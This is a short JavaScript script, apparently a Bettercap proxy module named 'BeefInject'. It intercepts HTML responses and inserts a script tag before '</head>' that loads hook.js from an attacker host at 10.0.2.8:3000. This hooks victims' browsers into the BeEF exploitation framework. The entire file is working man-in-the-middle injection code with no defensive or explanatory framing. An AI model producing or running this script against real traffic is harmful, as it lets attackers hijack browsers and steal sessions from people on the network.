function onLoad() {
  log( "BeefInject loaded." );
}

function onResponse(req, res) {
  if( res.ContentType.indexOf('text/html') == 0 ){
    var body = res.ReadBody();
    if( body.indexOf('</head>') != -1 ) {
 log( "BeefInject loaded." );
      res.Body = body.replace( 
        '</head>', 
        '<script type="text/javascript" src="http://10.0.2.8:3000/hook.js"></script></head>' 
      ); 
    }
  }
}
